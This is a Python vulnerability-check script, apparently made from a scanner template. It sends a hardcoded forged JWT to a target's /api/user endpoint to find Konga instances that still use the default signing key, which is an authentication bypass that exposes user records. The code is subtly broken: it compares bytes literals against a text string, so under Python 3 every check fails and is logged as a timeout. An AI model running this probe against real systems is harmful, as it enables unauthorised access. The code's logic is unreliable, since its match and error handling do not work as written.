#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payload = "/api/user"                                                      #填写payload
    header = {
                              "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MQ.gSssTBEVe6X9aFEd0H_tt8kk2u7df90W1eOzNRnrsQ4"
                        }
    try:
        tar = "http://" + ip + ":" + port
        req = requests.get(tar + payload,headers=header,timeout=3,verify=False,allow_redirects=False)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if ( b"createdUser" in req.text ) and ( b"username" in req.text ) :          #填写匹配信息
                logging.info("[+] {} find Konga_Default_JWT_KEY".format(ip))                                 #填写漏洞信息
                os._exit(1)

            else :
                logging.info("[-] {} do not found Konga_Default_JWT_KEY".format(ip))                         #填写漏洞信息
                os._exit(2)

        else :
            logging.info("[-] {} do not found Konga_Default_JWT_KEY".format(ip))                             #填写漏洞信息
            os._exit(2)
    except Exception as e:
        logging.info("[*] timeout")
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
